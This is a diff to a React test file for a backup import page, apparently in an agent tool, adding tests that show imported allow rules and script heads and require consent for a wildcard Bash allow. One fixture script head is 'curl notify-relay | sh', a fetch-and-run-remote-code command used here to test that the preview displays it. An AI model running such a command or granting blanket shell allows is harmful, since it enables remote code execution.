@@ -34,9 +34,11 @@ const { state, toastMock } = vi.hoisted(() => ({
     backupImportPhase: 'idle',
     backupImportError: null as string | null,
     backupImportResult: null as unknown,
+    hasBackupImportWildcardConsent: false,
     chooseBackupImportFile: vi.fn(async () => undefined),
     chooseBackupImportProjectParent: vi.fn(async () => undefined),
     setBackupImportWorkspaceTarget: vi.fn(),
+    setBackupImportWildcardConsent: vi.fn(),
     applyBackupImport: vi.fn(async () => undefined),
     resetBackupImport: vi.fn(),
   },
@@ -52,6 +54,23 @@ vi.mock('../../../../shared/components/Toast', () => ({
 
 import { BackupPage } from './index';
 
+const importPreviewWith = (overrides: Record<string, unknown>) => ({
+  sha256: 'sha-harborline',
+  manifest: {
+    schemaVersion: 3,
+    exportedAt: '2026-09-26T00:00:00.000Z',
+    workspaceCount: 1,
+    projectCount: 0,
+    workflowCount: 0,
+  },
+  workspaceMatches: [{ bundleId: 'w-1', name: 'Harborline', existingId: null, action: 'add' }],
+  projectMatches: [],
+  groupStats: [{ group: 'workspaces', adds: 1, updates: 0 }],
+  allowRules: [],
+  scripts: [],
+  ...overrides,
+});
+
 beforeEach(() => {
   vi.clearAllMocks();
   state.backupExportPreview = null;
@@ -65,6 +84,7 @@ beforeEach(() => {
   state.backupImportPhase = 'idle';
   state.backupImportError = null;
   state.backupImportResult = null;
+  state.hasBackupImportWildcardConsent = false;
 });
 afterEach(cleanup);
 
@@ -134,18 +154,7 @@ describe('BackupPage', () => {
 
   it('shows the import preview and applies it', async () => {
     state.backupImportPath = '/tmp/import.json';
-    state.backupImportPreview = {
-      manifest: {
-        schemaVersion: 3,
-        exportedAt: '2026-09-26T00:00:00.000Z',
-        workspaceCount: 1,
-        projectCount: 0,
-        workflowCount: 0,
-      },
-      workspaceMatches: [{ bundleId: 'w-1', name: 'Harborline', existingId: null, action: 'add' }],
-      projectMatches: [],
-      groupStats: [{ group: 'workspaces', adds: 1, updates: 0 }],
-    };
+    state.backupImportPreview = importPreviewWith({});
 
     render(<BackupPage />);
 
@@ -154,5 +163,94 @@ describe('BackupPage', () => {
     fireEvent.click(screen.getByRole('button', { name: 'Import now' }));
 
     await waitFor(() => expect(state.applyBackupImport).toHaveBeenCalledOnce());
+  });
+
+  it('lists each allow rule and each script head before importing', () => {
+    state.backupImportPath = '/tmp/import.json';
+    state.backupImportPreview = importPreviewWith({
+      allowRules: [
+        {
+          id: 'status',
+          scope: 'global',
+          patternTool: 'Bash',
+          patternArgsMatcher: 'git status',
+          isWildcard: false,
+          replacesDecision: 'deny',
+        },
+      ],
+      scripts: [
+        {
+          id: 'deploy',
+          projectId: 'payments-api',
+          name: 'deploy',
+          head: 'curl notify-relay | sh',
+          isUpdate: false,
+        },
+      ],
+    });
+
+    render(<BackupPage />);
+
+    screen.getByText('Bash(git status)');
+    screen.getByText('global, replaces a deny rule');
+    screen.getByText('deploy');
+    screen.getByText('curl notify-relay | sh');
+    screen.getByText('Imported scripts arrive disabled. Open one and save it to enable it.');
+  });
+
+  it('keeps Import now off until a wildcard allow has its own consent', () => {
+    state.backupImportPath = '/tmp/import.json';
+    state.backupImportPreview = importPreviewWith({
+      allowRules: [
+        {
+          id: 'any-bash',
+          scope: 'global',
+          patternTool: 'Bash',
+          patternArgsMatcher: null,
+          isWildcard: true,
+          replacesDecision: null,
+        },
+      ],
+    });
+
+    render(<BackupPage />);
+
+    const importNow = screen.getByRole('button', { name: 'Import now' });
+    expect(importNow).toHaveProperty('disabled', true);
+    fireEvent.click(screen.getByRole('checkbox', { name: /rule that matches anything/ }));
+    expect(state.setBackupImportWildcardConsent).toHaveBeenCalledWith({ isAccepted: true });
+  });
+
+  it('enables Import now once the wildcard allow is accepted', () => {
+    state.backupImportPath = '/tmp/import.json';
+    state.hasBackupImportWildcardConsent = true;
+    state.backupImportPreview = importPreviewWith({
+      allowRules: [
+        {
+          id: 'any-bash',
+          scope: 'global',
+          patternTool: 'Bash',
+          patternArgsMatcher: null,
+          isWildcard: true,
+          replacesDecision: null,
+        },
+      ],
+    });
+
+    render(<BackupPage />);
+
+    expect(screen.getByRole('button', { name: 'Import now' })).toHaveProperty('disabled', false);
+  });
+
+  it('shows the reason when the import is refused', () => {
+    state.backupImportResult = {
+      ok: false,
+      errors: [{ field: 'permissionRules[0].decision', message: 'wildcard allow needs consent' }],
+      stats: {},
+    };
+
+    render(<BackupPage />);
+
+    screen.getByText('wildcard allow needs consent');
   });
 });
